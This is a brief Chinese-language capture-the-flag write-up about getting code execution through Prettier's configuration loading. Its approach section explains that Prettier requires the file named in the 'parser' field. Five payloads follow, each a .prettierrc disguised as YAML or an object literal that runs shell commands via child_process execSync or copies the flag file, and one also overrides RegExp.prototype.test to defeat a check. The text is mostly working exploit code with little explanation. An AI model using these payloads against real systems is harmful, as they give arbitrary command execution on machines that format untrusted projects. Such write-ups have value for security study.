## 知识点
prettier配置文件 [https://prettier.io/docs/en/configuration.html](https://prettier.io/docs/en/configuration.html)<br />javascript绕过沙箱方法 [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)
## 思路
Prettier回将配置文件中的parser字段进行require包含<br />我们可以包含配置文件自己来执行js代码，并对代码进行yaml伪装
```yaml
var a=`: #`;module.exports = ()=>{return global.process.mainModule.constructor._load("child_process").execSync("/readflag").toString()};/*
trailingComma: es5
tabWidth: 4
semi: false
singleQuote: true
parser: .prettierrc
# */
```
```yaml
filepath: ".prettierrc"
parser: ".prettierrc"
parse: 
  - eval(module.exports = ()=> global.process.mainModule.constructor._load('child_process').execSync('/readflag').toString());
```
```yaml
/*/../app/.prettierrc
#*/const fs = require('fs'); var a = fs.readFileSync("flag", "utf-8");fs.writeFileSync("./dist/ret.js",a);fs.chmodSync("./dist/ret.js",0o444);process.addListener('uncaughtException', (err) => {console.log("ss",err);process.exit(0);})
```
```php
{
  parser: ".prettierrc",
  /x|x/.__proto__.test=()=>true,
  module.exports=()=>require("child_process").execSync("pwd;cat flag").toString()
}
// Hook RegExp.prototype.test
```
```php
parser: ".prettierrc"
foo: module.exports=_=>module.constructor._load('child_process').execSync('cat ./flag').toString()
```
